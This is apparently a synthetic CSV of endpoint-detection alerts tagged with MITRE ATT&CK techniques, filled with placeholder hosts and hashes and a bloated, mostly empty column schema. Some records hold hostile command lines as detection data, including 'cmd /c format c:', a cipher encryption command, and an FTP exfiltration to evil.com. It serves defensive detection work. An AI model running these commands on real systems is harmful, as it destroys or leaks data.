event_id,event_type,event_timestamp,event_category,event_description,severity,event_time,category,mitre_technique,host,event_severity,affected_hosts,event_details,action,detect_description,detect_id,technique,src_ip,src_port,protocol,user_name,process_name,technique_name,affected_host,affected_process,affected_file_path,command_line,parent_process,parent_process_command_line,detection_method,recommended_actions,event_version,event_data,event_name,endpoint,data,rule_name,recommendation,event_subtype,container_name,image_name,image_digest,registry,command,source_ip,destination_ip,process_path,username,detection,actor,host_info,event_url,event_hash,detected_by,details,device,source,target,attack_name,tactic,ip_address,process_id,metadata,alert_type,timestamp,detection_info,sensor_id,hostname,ip,user,domain,process_command_line,process_pid,parent_process_name,parent_process_pid,c2,files,detection_source,web_server_url,web_server_method,type,process,network,event,trigger,remediation,artifact_hiding,process_injection,security_control_disablement,file_deletion,name,affected_entities,dst_ip,kill_chain_phases,file,process_execution,registry_modification,cloud_infrastructure_modification,subtype,detection_details,customer_id,event_info,product,mitre,attack_details,description,destination_port,parent_process_id,email_sender,email_recipient,email_subject,email_urls,email_attachments,Severity,event_Timestamp,Affected_Hostname,Affected_File_Path,Alert_Source,Recommendation,Title,Tactic,Technique,Affected_Image_Path,Injected_Process_Name,Parent_Process_Name,Injection_Technique,indicators,actions,additional_info,file_info,network_info,Timestamp,Description,Loader_Process_Name,Loader_Technique,event_Source,tactics,recommendations,ip_addresses,mac_addresses,operating_system,agent_version,group_name,destination,threat_severity,threat_category,threat_name,ioc,tags,detect_name,rule_description,triggered_rule,alert_rule_name,alert_rule_id,alert_state,alert_time,src,process_tree,remediation_steps,event_categorty,kill_chain,image_loaded,target_image_loaded,target_image_name,target_command_line,EventID,Category,AffectedHostInfo,DetectionDetails,endpoint_id,web_service_name,web_service_path,ioc_type,ioc_value,process_details,host_details,DetectionId,Details,event_action,event_source,status,application,threat,source_port,file_write,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFilePath,AffectedFileSize,technique_id,event_creator,subtechnique_id,subtechnique,remote_server,mitre_attack_id,cloud_account,org_id,event_event_name,data_source,device_name,file_name,file_size,src_path,dst_path,host_name,file_path,md5_hash,sha256_hash,alert_data,detection_id,detection_time,detection_score,threat_score,device_id,device_external_ip,device_os,device_os_version,policy_name,policy_id,subcategory,file_permission_modification,Domain_Controller_IP,Domain_Controller_Name,combined_data
03040rt0f,threat,2022-04-01T12:34:56.789Z,Windows Management Instrumentation,Detects the use of Windows Management Instrumentation (WMI) for lateral movement or other malicious activities.,,,,,,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,process,wmiprvse.exe,"{'process_name': 'wmiprvse.exe', 'process_path': 'C:\\Windows\\System32\\wbem\\wmiprvse.exe', 'command_line': 'wmiprvse.exe /secured /caller:""NT AUTHORITY\\SYSTEM"" /embedding', 'process_sha256': 'ABC123...', 'parent_process_name': 'svchost.exe', 'parent_process_path': 'C:\\Windows\\System32\\svchost.exe', 'parent_process_command_line': 'svchost.exe -k DcomLaunch', 'parent_process_sha256': 'DEF456...', 'username': 'NT AUTHORITY\\SYSTEM', 'domain': 'NT AUTHORITY', 'process_start_time': '2022-04-01T12:30:00.000Z', 'process_end_time': '2022-04-01T12:34:00.000Z', 'pid': 1234, 'ppid': 5678}","{'hostname': 'DESKTOP-ABC123', 'ip_address': '192.168.1.100', 'mac_address': '12-34-56-78-9A-BC', 'os': 'Windows 10', 'os_version': '20H2', 'os_build': '19042.1083', 'agent_version': '6.22.0.0', 'agent_id': 'ABCDEF...', 'sensor_id': 'GHIJKL...', 'group_name': 'Workstations'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"event_id is 03040rt0f. event_type is threat. event_timestamp is 2022-04-01T12:34:56.789Z. event_category is Windows Management Instrumentation. event_description is Detects the use of Windows Management Instrumentation (WMI) for lateral movement or other malicious activities.. event_severity is high. ioc_type is process. ioc_value is wmiprvse.exe. process_details process_name is wmiprvse.exe. process_details process_path is C:\Windows\System32\wbem\wmiprvse.exe. process_details command_line is wmiprvse.exe /secured /caller:""NT AUTHORITY\SYSTEM"" /embedding. process_details process_sha256 is ABC123.... process_details parent_process_name is svchost.exe. process_details parent_process_path is C:\Windows\System32\svchost.exe. process_details parent_process_command_line is svchost.exe -k DcomLaunch. process_details parent_process_sha256 is DEF456.... process_details username is NT AUTHORITY\SYSTEM. process_details domain is NT AUTHORITY. process_details process_start_time is 2022-04-01T12:30:00.000Z. process_details process_end_time is 2022-04-01T12:34:00.000Z. host_details hostname is DESKTOP-ABC123. host_details ip_address is 192.168.1.100. host_details mac_address is 12-34-56-78-9A-BC. host_details os is Windows 10. host_details os_version is 20H2. host_details os_build is 19042.1083. host_details agent_version is 6.22.0.0. host_details agent_id is ABCDEF.... host_details sensor_id is GHIJKL.... host_details group_name is Workstations. "
12345,threat_detection,1646749633000,Account Access Removal,Account Access Removal detected on endpoint,,,,,,high,,,,,,,,,,,,,,,,,,,,,1.0,"{'hostname': 'example-hostname', 'user_name': 'N/A', 'affected_account_name': 'example-account', 'affected_account_sid': 'S-1-5-21-1234567890-1234567890-1234567890-1001', 'timestamp': '2022-03-07T16:47:13.000Z', 'attack_name': 'Account Access Removal', 'threat_score': 100, 'threat_indicators': [{'indicator_type': 'affected_account_name', 'indicator_value': 'example-account', 'indicator_description': 'Name of the account whose access was removed'}, {'indicator_type': 'affected_account_sid', 'indicator_value': 'S-1-5-21-1234567890-1234567890-1234567890-1001', 'indicator_description': 'Security Identifier (SID) of the account whose access was removed'}, {'indicator_type': 'command_line', 'indicator_value': 'net user example-account /active:no', 'indicator_description': 'Command line used for account access removal'}]}",Account Access Removal,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"event_id is 12345. event_type is threat_detection. event_timestamp is 1646749633000. event_category is Account Access Removal. event_description is Account Access Removal detected on endpoint. event_severity is high. event_data hostname is example-hostname. event_data user_name is N/A. event_data affected_account_name is example-account. event_data affected_account_sid is S-1-5-21-1234567890-1234567890-1234567890-1001. event_data timestamp is 2022-03-07T16:47:13.000Z. event_data attack_name is Account Access Removal. event_data threat_indicators is {'indicator_type': 'affected_account_name', 'indicator_value': 'example-account', 'indicator_description': 'Name of the account whose access was removed'}. event_data threat_indicators is {'indicator_type': 'affected_account_sid', 'indicator_value': 'S-1-5-21-1234567890-1234567890-1234567890-1001', 'indicator_description': 'Security Identifier (SID) of the account whose access was removed'}. event_data threat_indicators is {'indicator_type': 'command_line', 'indicator_value': 'net user example-account /active:no', 'indicator_description': 'Command line used for account access removal'}. event_name is Account Access Removal. "
73894756,threat_detection,2023-03-10T14:30:00.000Z,Build Image on Host,Endpoint detected Build Image on Host,,,,,,high,,,,,,,,,,,,Build Image on Host,,,,,,,,,,"{'process_name': 'docker', 'process_path': 'C:\\Program Files\\Docker\\Docker\\Docker Desktop.exe', 'process_command_line': '""C:\\Program Files\\Docker\\Docker\\Docker Desktop.exe""', 'hostname': 'ExampleHost01', 'ip_address': '192.168.1.100', 'username': 'JohnDoe', 'process_id': 1234, 'parent_process_id': 5678, 'parent_process_name': 'powershell.exe', 'parent_process_path': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'}",Build Image on Host,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"event_id is 73894756. event_type is threat_detection. event_timestamp is 2023-03-10T14:30:00.000Z. event_category is Build Image on Host. event_description is Endpoint detected Build Image on Host. event_severity is high. technique_name is Build Image on Host. event_data process_name is docker. event_data process_path is C:\Program Files\Docker\Docker\Docker Desktop.exe. event_data process_command_line is ""C:\Program Files\Docker\Docker\Docker Desktop.exe"". event_data hostname is ExampleHost01. event_data ip_address is 192.168.1.100. event_data username is JohnDoe. event_data parent_process_name is powershell.exe. event_data parent_process_path is C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe. event_name is Build Image on Host. "
EDR-T1609-1234567890,container_administration_command,,container administration,A container administration command was detected on the endpoint,high,2022-03-15T14:31:00Z,,,,,,,,,,T1609,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,docker exec -it <container_id> /bin/bash,,,,,,,,,,,,,"{'hostname': 'Endpoint-001', 'ip_address': '192.168.1.100'}",,,defense_evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234567890,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'hostname': 'Container-001', 'ip_address': '192.168.1.200'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is EDR-T1609-1234567890. event_type is container_administration_command. event_category is container administration. event_description is A container administration command was detected on the endpoint. severity is high. event_time is 2022-03-15T14:31:00Z. technique is T1609. command is docker exec -it <container_id> /bin/bash. source hostname is Endpoint-001. source ip_address is 192.168.1.100. tactic is defense_evasion. customer_id is 1234567890. destination hostname is Container-001. destination ip_address is 192.168.1.200. 
EDR-67890,,1646749633000,Custom Scripts for Internal Reconnaissance,Custom script detected on host SERVER-123 attempting to perform internal reconnaissance,,,,,,High,"[{'host_name': 'SERVER-123', 'ip_address': '10.0.0.1'}]","{'script_name': 'internal_scan.ps1', 'script_location': 'C:\\Scripts\\', 'script_arguments': '-o output.txt -s', 'script_result': 'Success', 'source_process': 'powershell.exe', 'process_commandline': 'powershell.exe -ExecutionPolicy Bypass C:\\Scripts\\internal_scan.ps1 -o output.txt -s', 'parent_process': 'cmd.exe', 'parent_commandline': 'cmd.exe /c start /b powershell.exe -ExecutionPolicy Bypass C:\\Scripts\\internal_scan.ps1 -o output.txt -s', 'user': 'jdoe'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is EDR-67890. event_timestamp is 1646749633000. event_category is Custom Scripts for Internal Reconnaissance. event_description is Custom script detected on host SERVER-123 attempting to perform internal reconnaissance. event_severity is High. affected_hosts host_name is SERVER-123. affected_hosts ip_address is 10.0.0.1. event_details script_name is internal_scan.ps1. event_details script_location is C:\Scripts\. event_details script_arguments is -o output.txt -s. event_details script_result is Success. event_details source_process is powershell.exe. event_details process_commandline is powershell.exe -ExecutionPolicy Bypass C:\Scripts\internal_scan.ps1 -o output.txt -s. event_details parent_process is cmd.exe. event_details parent_commandline is cmd.exe /c start /b powershell.exe -ExecutionPolicy Bypass C:\Scripts\internal_scan.ps1 -o output.txt -s. event_details user is jdoe. 
12345,threat detection,1646842350000,Data Encrypted for Impact,Data Encrypted for Impact detected on endpoint,,,,,,high,,,,,,,,,,,,,,,,,,,,,1.0,"{'hostname': 'example-hostname', 'user_name': 'example-user', 'timestamp_utc': '2022-03-08T15:12:30.000Z', 'mitre_attack_id': 'T1486', 'mitre_attack_name': 'Data Encrypted for Impact', 'threat_score': 100, 'threat_indicators': [{'indicator_type': 'file_path', 'indicator_value': 'C:\\Users\\example-user\\Documents\\example-file.txt', 'indicator_description': 'Path of the file that was encrypted'}, {'indicator_type': 'file_hash', 'indicator_value': '1234567890ABCDEF1234567890ABCDEF12345678', 'indicator_description': 'SHA-1 hash of the file that was encrypted'}, {'indicator_type': 'command_line', 'indicator_value': 'cmd /c cipher /e /a /s:C:\\Users\\example-user\\Documents\\example-file.txt', 'indicator_description': 'Command line used for data encryption'}]}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"event_id is 12345. event_type is threat detection. event_timestamp is 1646842350000. event_category is Data Encrypted for Impact. event_description is Data Encrypted for Impact detected on endpoint. event_severity is high. event_data hostname is example-hostname. event_data user_name is example-user. event_data timestamp_utc is 2022-03-08T15:12:30.000Z. event_data mitre_attack_id is T1486. event_data mitre_attack_name is Data Encrypted for Impact. event_data threat_indicators is {'indicator_type': 'file_path', 'indicator_value': 'C:\\Users\\example-user\\Documents\\example-file.txt', 'indicator_description': 'Path of the file that was encrypted'}. event_data threat_indicators is {'indicator_type': 'file_hash', 'indicator_value': '1234567890ABCDEF1234567890ABCDEF12345678', 'indicator_description': 'SHA-1 hash of the file that was encrypted'}. event_data threat_indicators is {'indicator_type': 'command_line', 'indicator_value': 'cmd /c cipher /e /a /s:C:\\Users\\example-user\\Documents\\example-file.txt', 'indicator_description': 'Command line used for data encryption'}. "
0304050f,,2023-03-09T10:30:15.000000Z,Suspicious data manipulation,Suspicious data manipulation activity or Data Obfuscation detected,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'threat_name': 'MITRE T1001 - Data Obfuscation', 'ioc': ['http://maliciousdomain.com', '8.8.8.8'], 'process_name': 'powershell.exe', 'process_pid': 1234, 'parent_process_name': 'explorer.exe', 'parent_process_pid': 5678, 'user_name': 'User1', 'domain_name': 'contoso', 'mitre_id': 'T1001'}",,"{'type': 'endpoint', 'hostname': 'DESKTOP-J2345', 'ip_address': '192.168.1.100'}","{'type': 'file', 'file_path': 'C:\\Users\\User1\\Documents\\sensitive.doc', 'hash': '4ab07e2b96a7b38f1bbceb31e313b023'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 0304050f. event_timestamp is 2023-03-09T10:30:15.000000Z. event_category is Suspicious data manipulation. event_description is Suspicious data manipulation activity or Data Obfuscation detected. severity is high. details threat_name is MITRE T1001 - Data Obfuscation. details ioc is http://maliciousdomain.com. details ioc is 8.8.8.8. details process_name is powershell.exe. details parent_process_name is explorer.exe. details user_name is User1. details domain_name is contoso. details mitre_id is T1001. source type is endpoint. source hostname is DESKTOP-J2345. source ip_address is 192.168.1.100. target type is file. target file_path is C:\Users\User1\Documents\sensitive.doc. target hash is 4ab07e2b96a7b38f1bbceb31e313b023. 
123456789,threat detection,2022-03-07T12:30:00Z,Data transfer size limits,Data transfer size limits were exceeded on endpoint,,,,,,high,,,,,,,192.168.1.100,,,,,,,,,,,,,,,,,,,,,Data Transfer Size Limits Detected,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"[{'entity_type': 'Endpoint', 'entity_name': 'Endpoint001', 'os': 'Windows 10', 'username': 'User001'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 123456789. event_type is threat detection. event_timestamp is 2022-03-07T12:30:00Z. event_category is Data transfer size limits. event_description is Data transfer size limits were exceeded on endpoint. event_severity is high. src_ip is 192.168.1.100. event_subtype is Data Transfer Size Limits Detected. affected_entities entity_type is Endpoint. affected_entities entity_name is Endpoint001. affected_entities os is Windows 10. affected_entities username is User001. 
03040450fjk,threat_detection,2023-03-10T12:00:00Z,defense evasion,The process %process_name% attempted to evade detection by a debugger.,,,,,,high,,,,,,Debugger Evasion,,,,,,,,,,,,,,,,,Debugger Evasion Detected,,,,Investigate the process %process_name% for signs of malicious activity.,,,,,,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 03040450fjk. event_type is threat_detection. event_timestamp is 2023-03-10T12:00:00Z. event_category is defense evasion. event_description is The process %process_name% attempted to evade detection by a debugger.. event_severity is high. technique is Debugger Evasion. event_name is Debugger Evasion Detected. recommendation is Investigate the process %process_name% for signs of malicious activity.. tactic is Defense Evasion. 
12345,DetectionSummaryEvent,1646749655000,Disk Wiping,Potential disk wiping activity was detected on the device.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,123456.0,"{'HostInfo': {'HostName': 'example-device', 'OsType': 'Windows', 'OsVersion': '10.0.19042', 'IpAddress': '192.168.1.100', 'MacAddress': '00-11-22-33-44-55', 'Domain': 'example.com', 'UserName': 'user123'}, 'ProcessInfo': {'ProcessName': 'cmd.exe', 'ProcessCommandLine': 'cmd /c format c:', 'ProcessStartTime': '2022-03-20T15:40:00Z', 'ProcessParentName': 'explorer.exe', 'ProcessParentCommandLine': 'explorer.exe', 'ProcessParentStartTime': '2022-03-20T15:30:00Z'}, 'TargetInfo': {'HostName': 'example-device2', 'OsType': 'Windows', 'OsVersion': '10.0.19042', 'UserName': 'user456'}, 'RuleName': 'Disk Wiping Detection', 'RuleId': '789012'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 12345. event_type is DetectionSummaryEvent. event_timestamp is 1646749655000. event_category is Disk Wiping. event_description is Potential disk wiping activity was detected on the device.. Severity is high. Details HostInfo HostName is example-device. Details HostInfo OsType is Windows. Details HostInfo OsVersion is 10.0.19042. Details HostInfo IpAddress is 192.168.1.100. Details HostInfo MacAddress is 00-11-22-33-44-55. Details HostInfo Domain is example.com. Details HostInfo UserName is user123. Details ProcessInfo ProcessName is cmd.exe. Details ProcessInfo ProcessCommandLine is cmd /c format c:. Details ProcessInfo ProcessStartTime is 2022-03-20T15:40:00Z. Details ProcessInfo ProcessParentName is explorer.exe. Details ProcessInfo ProcessParentCommandLine is explorer.exe. Details ProcessInfo ProcessParentStartTime is 2022-03-20T15:30:00Z. Details TargetInfo HostName is example-device2. Details TargetInfo OsType is Windows. Details TargetInfo OsVersion is 10.0.19042. Details TargetInfo UserName is user456. Details RuleName is Disk Wiping Detection. Details RuleId is 789012. 
nfkskfjs,threat_detection,1646947200,policy_modification,A domain policy was modified on the endpoint,,,,,,high,,"{'affected_entities': [{'entity_type': 'domain_policy', 'entity_name': 'example-policy'}]}",,,,,,,,,,,,,,,,,,,1.0,,,"{'hostname': 'example-host', 'ip_address': '192.168.1.1', 'operating_system': 'Windows 10'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,detect,endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"event_id is nfkskfjs. event_type is threat_detection. event_timestamp is 1646947200. event_category is policy_modification. event_description is A domain policy was modified on the endpoint. event_severity is high. event_details affected_entities is {'entity_type': 'domain_policy', 'entity_name': 'example-policy'}. endpoint hostname is example-host. endpoint ip_address is 192.168.1.1. endpoint operating_system is Windows 10. event_action is detect. event_source is endpoint. "
12345,threat detection,1646749655000,data exfiltration,Exfiltration Over Other Network Medium Detected,high,,,,,,,,detect,,,,,,"{'name': 'FTP', 'direction': 'outbound'}",,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ABC123,DESKTOP-ABC123,192.168.1.100,JohnDoe,DOMAIN,explorer.exe ftp://evil.com/SensitiveData.txt,1234.0,,,,"[{'name': 'SensitiveData.txt', 'type': 'exfiltrated'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 12345. event_type is threat detection. event_timestamp is 1646749655000. event_category is data exfiltration. event_description is Exfiltration Over Other Network Medium Detected. severity is high. action is detect. protocol name is FTP. protocol direction is outbound. process_name is explorer.exe. sensor_id is ABC123. hostname is DESKTOP-ABC123. ip is 192.168.1.100. user is JohnDoe. domain is DOMAIN. process_command_line is explorer.exe ftp://evil.com/SensitiveData.txt. files name is SensitiveData.txt. files type is exfiltrated. 
304596987,Exploit Public-Facing Application,2022-12-31T23:59:59Z,exploit public facing application,Exploit Public-Facing Application detected and blocked,high,,,,"{'id': 'host456', 'name': 'myserver.example.com', 'os': 'Windows', 'ip_address': '192.168.1.1'}",,,,blocked,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'id': 'user123', 'name': 'John Smith'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,new,"{'name': 'HTTP Server', 'version': '2.0'}","{'name': 'CVE-2022-1234', 'type': 'exploit', 'source': 'unknown', 'indicators': [{'id': 'indicator123', 'type': 'file_hash', 'value': 'abc123def456', 'description': 'Hash of malicious file'}]}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"event_id is 304596987. event_type is Exploit Public-Facing Application. event_timestamp is 2022-12-31T23:59:59Z. event_category is exploit public facing application. event_description is Exploit Public-Facing Application detected and blocked. severity is high. host id is host456. host name is myserver.example.com. host os is Windows. host ip_address is 192.168.1.1. action is blocked. user id is user123. user name is John Smith. status is new. application name is HTTP Server. application version is 2.0. threat name is CVE-2022-1234. threat type is exploit. threat source is unknown. threat indicators is {'id': 'indicator123', 'type': 'file_hash', 'value': 'abc123def456', 'description': 'Hash of malicious file'}. "
123456,alert,,Ingress Tool Transfer,Potential ingress tool transfer detected,medium,2023-03-09T12:00:00.000000Z,,,,,,,,,,,,,,,powershell.exe,Ingress Tool Transfer,,,,powershell.exe -NoProfile -ExecutionPolicy unrestricted -EncodedCommand ,,,,,,,,,,,,,,,,,,192.168.1.100,10.0.2.15,,,,,,,,,,,,,,Initial Access,,5678.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,443.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,MITRE T1105,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,57234.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 123456. event_type is alert. event_category is Ingress Tool Transfer. event_description is Potential ingress tool transfer detected. severity is medium. event_time is 2023-03-09T12:00:00.000000Z. process_name is powershell.exe. technique_name is Ingress Tool Transfer. command_line is powershell.exe -NoProfile -ExecutionPolicy unrestricted -EncodedCommand . source_ip is 192.168.1.100. destination_ip is 10.0.2.15. tactic is Initial Access. alert_rule_name is MITRE T1105. 
002040g,detect,2023-03-10T20:00:00Z,file_write,An attempt to modify the system's disk image or firmware.,critical,,,,{'hostname': 'server01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized modification of system file'},,,,,,,,,,,,,,,,,,,,,{'username': 'system'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'file_path': 'C:\\Windows\\System32\\ntoskrnl.exe', 'file_sha256': '4a4bfcf2b926c387b7d9c9ea9ca95e3e3a67f5d6d0c6b3a3f3c6b5d5e5f0f0f0', 'file_size': 1683456}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 002040g. event_type is detect. event_timestamp is 2023-03-10T20:00:00Z. event_category is file_write. event_description is An attempt to modify the system's disk image or firmware.. severity is critical. host hostname is server01. detection reason is Unauthorized modification of system file. user username is system. file_write file_path is C:\Windows\System32\ntoskrnl.exe. file_write file_sha256 is 4a4bfcf2b926c387b7d9c9ea9ca95e3e3a67f5d6d0c6b3a3f3c6b5d5e5f0f0f0. 
3050603d,,2023-03-09T12:00:00.000000Z,command and control,Non-Application Layer Protocol,,,,,,high,,,,,,Non-Application Layer Protocol,,,UDP,,nslookup.exe,,,,,,,C:\Windows\System32\cmd.exe,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,Command and Control,,1234.0,,,,,,,,DOMAIN\user,,C:\Windows\System32\nslookup.exe example.com,,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,53.0,5678.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 3050603d. event_timestamp is 2023-03-09T12:00:00.000000Z. event_category is command and control. event_description is Non-Application Layer Protocol. event_severity is high. technique is Non-Application Layer Protocol. protocol is UDP. process_name is nslookup.exe. parent_process_command_line is C:\Windows\System32\cmd.exe. source_ip is 192.168.1.100. destination_ip is 10.0.0.2. tactic is Command and Control. user is DOMAIN\user. process_command_line is C:\Windows\System32\nslookup.exe example.com. parent_process_name is cmd.exe. 
